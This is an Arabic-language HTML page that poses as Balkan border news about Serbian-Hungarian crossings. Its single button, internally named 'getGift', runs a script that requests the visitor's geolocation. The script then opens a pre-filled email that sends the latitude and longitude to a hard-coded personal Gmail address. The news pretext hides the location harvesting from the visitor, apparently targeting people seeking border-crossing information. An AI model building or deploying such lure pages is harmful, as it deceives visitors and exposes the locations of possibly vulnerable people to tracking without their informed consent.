<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>اخبار البلقان</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: url('https://example.com/your-background-image.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px;
      border-radius: 10px;
      width: 80%;
      max-width: 500px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    }

    h1 {
      font-size: 3em;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.2em;
      margin-bottom: 30px;
    }

    button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      font-size: 20px;
      cursor: pointer;
      border-radius: 5px;
      transition: 0.3s;
    }

    button:hover {
      background-color: #45a049;
    }

    /* For responsive design */
    @media (max-width: 600px) {
      h1 {
        font-size: 2em;
      }

      p {
        font-size: 1em;
      }

      button {
        padding: 12px 20px;
        font-size: 18px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>جميع النقاط العبور!</h1>
    <p> الحدود متوتره حدود هنقاريه مزيد من الاخبار</p>
    <button id="getGift">اخبار الحدود الصربيه الهنقاريه  </button>
  </div>

  <script>
    document.getElementById("getGift").onclick = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          
          // Encode the location in a mailto link
          const subject = encodeURIComponent("موقعي الحالي");
          const body = encodeURIComponent(`إليك موقعي:\nخط العرض: ${latitude}\nخط الطول: ${longitude}`);
          const email = "qmahdi2000@gmail.com"; // Replace with your email address
          const mailtoLink = `mailto:${email}?subject=${subject}&body=${body}`;

          // Open the mailto link
          window.location.href = mailtoLink;
        }, function(error) {
          alert("تعذر الحصول على الموقع. يرجى تمكين الوصول إلى الموقع والمحاولة مرة أخرى.");
        });
      } else {
        alert("المتصفح لا يدعم ميزة تحديد الموقع.");
      }
    };
  </script>

</body>
</html>
